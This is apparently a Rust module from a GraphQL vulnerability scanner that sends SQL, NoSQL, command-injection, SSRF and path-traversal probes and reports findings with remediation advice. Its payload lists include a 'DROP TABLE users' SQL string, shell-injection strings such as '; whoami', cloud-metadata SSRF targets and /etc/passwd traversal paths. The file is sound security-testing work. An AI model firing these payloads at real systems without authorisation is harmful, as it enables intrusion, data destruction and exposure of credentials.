//! GraphQL Injection Testing
//!
//! Tests for various injection vulnerabilities in GraphQL endpoints:
//! - SQL Injection via arguments
//! - NoSQL Injection
//! - Command Injection
//! - Server-Side Request Forgery (SSRF)
//! - Path Traversal
//! - LDAP Injection

use anyhow::Result;
use log::{debug, info, warn};
use reqwest::Client;
use serde_json::{json, Value};
use url::Url;
use std::time::Duration;
use tokio::time::sleep;

use crate::types::Severity;
use super::types::{GraphQLFinding, GraphQLFindingType, GraphQLScanConfig};

/// SQL injection payloads
const SQLI_PAYLOADS: &[&str] = &[
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "') OR ('1'='1",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "-1' UNION SELECT 1,2,3--",
    "' HAVING 1=1--",
    "' GROUP BY columnname HAVING 1=1--",
];

/// SQL injection detection patterns
const SQLI_PATTERNS: &[&str] = &[
    "sql syntax",
    "mysql_",
    "sqlite_",
    "postgresql",
    "ora-",
    "syntax error",
    "unclosed quotation",
    "unterminated string",
    "query failed",
    "sql error",
    "database error",
    "pg_query",
    "mysqli_",
    "you have an error in your sql",
    "warning: mysql",
    "sqlstate",
    "odbc error",
];

/// NoSQL injection payloads
const NOSQL_PAYLOADS: &[(&str, &str)] = &[
    // MongoDB operators
    (r#"{"$gt": ""}"#, "MongoDB $gt operator"),
    (r#"{"$ne": null}"#, "MongoDB $ne operator"),
    (r#"{"$where": "sleep(5000)"}"#, "MongoDB $where with sleep"),
    (r#"{"$regex": ".*"}"#, "MongoDB $regex operator"),
    (r#"{"$or": [{"a": 1}, {"b": 1}]}"#, "MongoDB $or operator"),
    // JSON injection
    (r#"{"__proto__": {"admin": true}}"#, "Prototype pollution"),
    (r#"true, \"admin\": true, \"__ignored\": \""#, "JSON injection"),
];

/// Command injection payloads
const COMMAND_PAYLOADS: &[(&str, &str)] = &[
    ("; sleep 5", "Sleep command (Unix)"),
    ("| sleep 5", "Pipe to sleep (Unix)"),
    ("`sleep 5`", "Backtick command (Unix)"),
    ("$(sleep 5)", "Subshell command (Unix)"),
    ("; ping -c 5 127.0.0.1", "Ping command (Unix)"),
    ("& ping -n 5 127.0.0.1", "Ping command (Windows)"),
    ("| ping -n 5 127.0.0.1", "Pipe to ping (Windows)"),
    ("; whoami", "Whoami (Unix)"),
    ("& whoami", "Whoami (Windows)"),
    ("|| whoami", "OR command execution"),
    ("&& whoami", "AND command execution"),
];

/// SSRF payloads
const SSRF_PAYLOADS: &[(&str, &str)] = &[
    ("http://localhost", "Localhost"),
    ("http://127.0.0.1", "127.0.0.1"),
    ("http://[::1]", "IPv6 localhost"),
    ("http://0.0.0.0", "0.0.0.0"),
    ("http://169.254.169.254", "AWS metadata"),
    ("http://metadata.google.internal", "GCP metadata"),
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata path"),
    ("file:///etc/passwd", "File protocol"),
    ("gopher://localhost:6379/", "Gopher protocol"),
    ("dict://localhost:6379/", "Dict protocol"),
];

/// Path traversal payloads
const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
];

/// Test for injection vulnerabilities
pub async fn test_injections(
    client: &Client,
    url: &Url,
    config: &GraphQLScanConfig,
) -> Result<Vec<GraphQLFinding>> {
    let mut findings = Vec::new();

    // Get discoverable fields first
    let fields = discover_injectable_fields(client, url).await?;

    for field in &fields {
        // Test SQL injection
        let sqli_findings = test_sql_injection(client, url, field, config).await?;
        findings.extend(sqli_findings);

        // Rate limiting
        sleep(Duration::from_millis(config.rate_limit_ms)).await;

        // Test NoSQL injection
        let nosql_findings = test_nosql_injection(client, url, field, config).await?;
        findings.extend(nosql_findings);

        sleep(Duration::from_millis(config.rate_limit_ms)).await;

        // Test command injection (if field looks like it could execute commands)
        if is_potential_command_field(field) {
            let cmd_findings = test_command_injection(client, url, field, config).await?;
            findings.extend(cmd_findings);
            sleep(Duration::from_millis(config.rate_limit_ms)).await;
        }

        // Test SSRF (if field looks like URL/path input)
        if is_potential_url_field(field) {
            let ssrf_findings = test_ssrf(client, url, field, config).await?;
            findings.extend(ssrf_findings);
            sleep(Duration::from_millis(config.rate_limit_ms)).await;
        }

        // Test path traversal (if field looks like file path)
        if is_potential_path_field(field) {
            let traversal_findings = test_path_traversal(client, url, field, config).await?;
            findings.extend(traversal_findings);
            sleep(Duration::from_millis(config.rate_limit_ms)).await;
        }
    }

    Ok(findings)
}

/// Discover fields that accept user input
async fn discover_injectable_fields(
    client: &Client,
    url: &Url,
) -> Result<Vec<DiscoverableField>> {
    let mut fields = Vec::new();

    // Try common query patterns to discover fields
    let test_queries = [
        // User queries
        (r#"{ user(id: "1") { id } }"#, "user", "id"),
        (r#"{ users(filter: {}) { id } }"#, "users", "filter"),
        (r#"{ search(query: "test") { id } }"#, "search", "query"),
        (r#"{ find(term: "test") { id } }"#, "find", "term"),
        // File/resource queries
        (r#"{ file(path: "test") { content } }"#, "file", "path"),
        (r#"{ download(url: "test") { data } }"#, "download", "url"),
        (r#"{ fetch(source: "test") { result } }"#, "fetch", "source"),
        // Data queries
        (r#"{ getItem(name: "test") { value } }"#, "getItem", "name"),
        (r#"{ lookup(key: "test") { data } }"#, "lookup", "key"),
        (r#"{ query(sql: "test") { rows } }"#, "query", "sql"),
    ];

    for (query, field_name, arg_name) in test_queries {
        let query_body = json!({ "query": query });

        let response = client
            .post(url.as_str())
            .header("Content-Type", "application/json")
            .json(&query_body)
            .send()
            .await;

        if let Ok(resp) = response {
            let body: Value = resp.json().await.unwrap_or(Value::Null);

            // Check if the query was valid (even if it returned null/empty)
            if body.get("data").is_some() && body.get("errors").is_none() {
                fields.push(DiscoverableField {
                    query_name: field_name.to_string(),
                    argument_name: arg_name.to_string(),
                    base_query: query.to_string(),
                });
            }
        }
    }

    // Always add generic test fields
    fields.push(DiscoverableField {
        query_name: "user".to_string(),
        argument_name: "id".to_string(),
        base_query: r#"{ user(id: "$PAYLOAD") { id name } }"#.to_string(),
    });

    Ok(fields)
}

#[derive(Debug, Clone)]
struct DiscoverableField {
    query_name: String,
    argument_name: String,
    base_query: String,
}

/// Test for SQL injection
async fn test_sql_injection(
    client: &Client,
    url: &Url,
    field: &DiscoverableField,
    config: &GraphQLScanConfig,
) -> Result<Vec<GraphQLFinding>> {
    let mut findings = Vec::new();

    for payload in SQLI_PAYLOADS {
        let query = build_injection_query(&field.base_query, &field.argument_name, payload);

        let response = send_graphql_query(client, url, &query).await?;

        if let Some(body) = response {
            let body_lower = body.to_lowercase();

            // Check for SQL error patterns
            for pattern in SQLI_PATTERNS {
                if body_lower.contains(pattern) {
                    findings.push(
                        GraphQLFinding::new(
                            GraphQLFindingType::SqlInjection,
                            Severity::Critical,
                            format!("SQL Injection in {}.{}", field.query_name, field.argument_name),
                            format!(
                                "SQL injection vulnerability detected in the '{}' argument of '{}' query. The application returned a database error when a SQL payload was injected, indicating that user input is being directly incorporated into SQL queries.",
                                field.argument_name, field.query_name
                            ),
                            format!("Payload: {} | Pattern matched: {}", payload, pattern),
                            "Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries. Implement input validation and consider using an ORM with proper escaping.",
                        ).with_field(format!("{}.{}", field.query_name, field.argument_name))
                    );
                    return Ok(findings); // One finding per field is enough
                }
            }
        }

        sleep(Duration::from_millis(config.rate_limit_ms)).await;
    }

    Ok(findings)
}

/// Test for NoSQL injection
async fn test_nosql_injection(
    client: &Client,
    url: &Url,
    field: &DiscoverableField,
    config: &GraphQLScanConfig,
) -> Result<Vec<GraphQLFinding>> {
    let mut findings = Vec::new();

    for (payload, description) in NOSQL_PAYLOADS {
        // Try as JSON object in filter
        let filter_query = format!(
            r#"{{ {}(filter: {}) {{ id }} }}"#,
            field.query_name, payload
        );

        let response = send_graphql_query(client, url, &filter_query).await?;

        if let Some(body) = response {
            // Check for successful data return with operator payload
            if body.contains("\"data\"") && !body.contains("\"errors\"") {
                // This might indicate the operator was processed
                // Additional verification needed
                debug!("NoSQL payload {} might have worked: {}", description, payload);
            }

            // Check for MongoDB-specific errors
            let body_lower = body.to_lowercase();
            if body_lower.contains("mongodb") ||
               body_lower.contains("$where") ||
               body_lower.contains("operator") {
                findings.push(
                    GraphQLFinding::new(
                        GraphQLFindingType::NoSqlInjection,
                        Severity::Critical,
                        format!("NoSQL Injection in {}", field.query_name),
                        format!(
                            "NoSQL injection vulnerability detected. The application appears to process NoSQL operators in the '{}' query, potentially allowing database manipulation.",
                            field.query_name
                        ),
                        format!("Payload: {} | Type: {}", payload, description),
                        "Sanitize and validate all input before using in database queries. Disable the $where operator if not needed. Use MongoDB's query builder methods instead of raw operators.",
                    ).with_field(field.query_name.clone())
                );
                return Ok(findings);
            }
        }

        sleep(Duration::from_millis(config.rate_limit_ms)).await;
    }

    Ok(findings)
}

/// Test for command injection
async fn test_command_injection(
    client: &Client,
    url: &Url,
    field: &DiscoverableField,
    config: &GraphQLScanConfig,
) -> Result<Vec<GraphQLFinding>> {
    let mut findings = Vec::new();

    for (payload, description) in COMMAND_PAYLOADS {
        let query = build_injection_query(&field.base_query, &field.argument_name, payload);

        let start = std::time::Instant::now();
        let response = send_graphql_query(client, url, &query).await?;
        let elapsed = start.elapsed();

        if let Some(body) = response {
            let body_lower = body.to_lowercase();

            // Check for command output or timing
            if body_lower.contains("root:") ||         // /etc/passwd content
               body_lower.contains("uid=") ||          // whoami output
               body_lower.contains("administrator") || // Windows user
               elapsed.as_secs() >= 4 {                // Sleep/delay worked
                findings.push(
                    GraphQLFinding::new(
                        GraphQLFindingType::CommandInjection,
                        Severity::Critical,
                        format!("Command Injection in {}.{}", field.query_name, field.argument_name),
                        format!(
                            "Command injection vulnerability detected in the '{}' argument. The application appears to execute system commands with user-controlled input, which could allow arbitrary command execution on the server.",
                            field.argument_name
                        ),
                        format!("Payload: {} | Type: {} | Response time: {:?}", payload, description, elapsed),
                        "Never pass user input directly to system commands. Use safe APIs that don't invoke shells. If command execution is necessary, use strict whitelisting and input validation.",
                    ).with_field(format!("{}.{}", field.query_name, field.argument_name))
                );
                return Ok(findings);
            }
        }

        sleep(Duration::from_millis(config.rate_limit_ms)).await;
    }

    Ok(findings)
}

/// Test for SSRF
async fn test_ssrf(
    client: &Client,
    url: &Url,
    field: &DiscoverableField,
    config: &GraphQLScanConfig,
) -> Result<Vec<GraphQLFinding>> {
    let mut findings = Vec::new();

    for (payload, description) in SSRF_PAYLOADS {
        let query = build_injection_query(&field.base_query, &field.argument_name, payload);

        let response = send_graphql_query(client, url, &query).await?;

        if let Some(body) = response {
            let body_lower = body.to_lowercase();

            // Check for SSRF indicators
            if body_lower.contains("root:x:") ||           // /etc/passwd
               body_lower.contains("instance-id") ||        // AWS metadata
               body_lower.contains("project-id") ||         // GCP metadata
               body_lower.contains("computeMetadata") ||    // GCP metadata
               body_lower.contains("ami-id") ||             // AWS AMI
               body_lower.contains("[boot loader]") ||      // Windows system.ini
               body_lower.contains("localhost") ||
               body.len() > 1000 && !body.contains("error") {  // Large response might indicate successful fetch
                findings.push(
                    GraphQLFinding::new(
                        GraphQLFindingType::ServerSideRequestForgery,
                        Severity::High,
                        format!("SSRF in {}.{}", field.query_name, field.argument_name),
                        format!(
                            "Server-Side Request Forgery vulnerability detected in the '{}' argument. The application makes requests to URLs controlled by user input, potentially allowing access to internal services.",
                            field.argument_name
                        ),
                        format!("Payload: {} | Target: {}", payload, description),
                        "Validate and sanitize all URLs. Use an allowlist of permitted domains. Block requests to internal IP ranges and cloud metadata endpoints. Consider using a web proxy for external requests.",
                    ).with_field(format!("{}.{}", field.query_name, field.argument_name))
                );
                return Ok(findings);
            }
        }

        sleep(Duration::from_millis(config.rate_limit_ms)).await;
    }

    Ok(findings)
}

/// Test for path traversal
async fn test_path_traversal(
    client: &Client,
    url: &Url,
    field: &DiscoverableField,
    config: &GraphQLScanConfig,
) -> Result<Vec<GraphQLFinding>> {
    let mut findings = Vec::new();

    for payload in PATH_TRAVERSAL_PAYLOADS {
        let query = build_injection_query(&field.base_query, &field.argument_name, payload);

        let response = send_graphql_query(client, url, &query).await?;

        if let Some(body) = response {
            let body_lower = body.to_lowercase();

            // Check for path traversal success indicators
            if body_lower.contains("root:x:") ||         // /etc/passwd
               body_lower.contains("[boot loader]") ||   // system.ini
               body_lower.contains("127.0.0.1") ||       // hosts file
               body_lower.contains("localhost") ||       // hosts file
               (body.len() > 100 && body.contains("/") && !body.contains("error")) {
                findings.push(
                    GraphQLFinding::new(
                        GraphQLFindingType::PathTraversal,
                        Severity::High,
                        format!("Path Traversal in {}.{}", field.query_name, field.argument_name),
                        format!(
                            "Path traversal vulnerability detected in the '{}' argument. The application appears to read files using paths controlled by user input, allowing access to files outside the intended directory.",
                            field.argument_name
                        ),
                        format!("Payload: {}", payload),
                        "Validate and sanitize file paths. Use a whitelist of allowed files or directories. Avoid using user input in file paths. Use chroot or similar isolation if file access is required.",
                    ).with_field(format!("{}.{}", field.query_name, field.argument_name))
                );
                return Ok(findings);
            }
        }

        sleep(Duration::from_millis(config.rate_limit_ms)).await;
    }

    Ok(findings)
}

/// Build a GraphQL query with an injection payload
fn build_injection_query(base_query: &str, _arg_name: &str, payload: &str) -> String {
    // Escape payload for use in GraphQL string
    let escaped_payload = payload
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n");

    // Replace $PAYLOAD marker or append to existing value
    if base_query.contains("$PAYLOAD") {
        base_query.replace("$PAYLOAD", &escaped_payload)
    } else {
        // Try to find and replace the argument value
        base_query.replace("\"1\"", &format!("\"{}\"", escaped_payload))
               .replace("\"test\"", &format!("\"{}\"", escaped_payload))
    }
}

/// Send a GraphQL query and return the response body
async fn send_graphql_query(
    client: &Client,
    url: &Url,
    query: &str,
) -> Result<Option<String>> {
    let query_body = json!({ "query": query });

    let response = client
        .post(url.as_str())
        .header("Content-Type", "application/json")
        .json(&query_body)
        .send()
        .await;

    match response {
        Ok(resp) => {
            let body = resp.text().await?;
            Ok(Some(body))
        }
        Err(e) => {
            debug!("Request failed: {}", e);
            Ok(None)
        }
    }
}

/// Check if field might accept command input
fn is_potential_command_field(field: &DiscoverableField) -> bool {
    let name = field.query_name.to_lowercase();
    name.contains("exec") ||
    name.contains("run") ||
    name.contains("command") ||
    name.contains("shell") ||
    name.contains("process") ||
    name.contains("system")
}

/// Check if field might accept URL input
fn is_potential_url_field(field: &DiscoverableField) -> bool {
    let name = field.query_name.to_lowercase();
    let arg = field.argument_name.to_lowercase();
    name.contains("fetch") ||
    name.contains("download") ||
    name.contains("import") ||
    name.contains("load") ||
    name.contains("proxy") ||
    arg.contains("url") ||
    arg.contains("uri") ||
    arg.contains("source") ||
    arg.contains("href")
}

/// Check if field might accept file path input
fn is_potential_path_field(field: &DiscoverableField) -> bool {
    let name = field.query_name.to_lowercase();
    let arg = field.argument_name.to_lowercase();
    name.contains("file") ||
    name.contains("read") ||
    name.contains("open") ||
    name.contains("include") ||
    name.contains("template") ||
    arg.contains("path") ||
    arg.contains("file") ||
    arg.contains("filename") ||
    arg.contains("dir")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_injection_query_with_placeholder() {
        let query = r#"{ user(id: "$PAYLOAD") { id } }"#;
        let result = build_injection_query(query, "id", "' OR '1'='1");
        assert!(result.contains("' OR '1'='1"));
    }

    #[test]
    fn test_build_injection_query_escape() {
        let query = r#"{ user(id: "$PAYLOAD") { id } }"#;
        let result = build_injection_query(query, "id", "test\"injection");
        assert!(result.contains("test\\\"injection"));
    }

    #[test]
    fn test_is_potential_command_field() {
        let field = DiscoverableField {
            query_name: "executeCommand".to_string(),
            argument_name: "cmd".to_string(),
            base_query: "".to_string(),
        };
        assert!(is_potential_command_field(&field));

        let safe_field = DiscoverableField {
            query_name: "getUser".to_string(),
            argument_name: "id".to_string(),
            base_query: "".to_string(),
        };
        assert!(!is_potential_command_field(&safe_field));
    }

    #[test]
    fn test_is_potential_url_field() {
        let field = DiscoverableField {
            query_name: "fetchResource".to_string(),
            argument_name: "url".to_string(),
            base_query: "".to_string(),
        };
        assert!(is_potential_url_field(&field));
    }

    #[test]
    fn test_is_potential_path_field() {
        let field = DiscoverableField {
            query_name: "readFile".to_string(),
            argument_name: "path".to_string(),
            base_query: "".to_string(),
        };
        assert!(is_potential_path_field(&field));
    }
}
